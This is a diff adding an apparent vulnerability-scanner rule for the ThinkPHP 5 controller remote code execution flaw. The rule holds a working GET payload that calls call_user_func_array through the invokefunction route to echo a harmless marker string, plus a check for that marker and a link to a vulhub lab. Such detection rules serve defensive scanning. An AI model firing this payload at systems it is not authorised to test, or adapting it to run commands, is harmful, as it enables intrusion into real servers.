@@ -1,0 +1,10 @@
+name: poc-yaml-thinkphp5-controller-rce
+rules:
+  - method: GET
+    path: /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=a29hbHIgaXMg%25%25d2F0Y2hpbmcgeW91
+    expression: |
+      response.body.bcontains(b"a29hbHIgaXMg%d2F0Y2hpbmcgeW9129")
+
+detail:
+  links:
+    - https://github.com/vulhub/vulhub/tree/master/thinkphp/5-rce
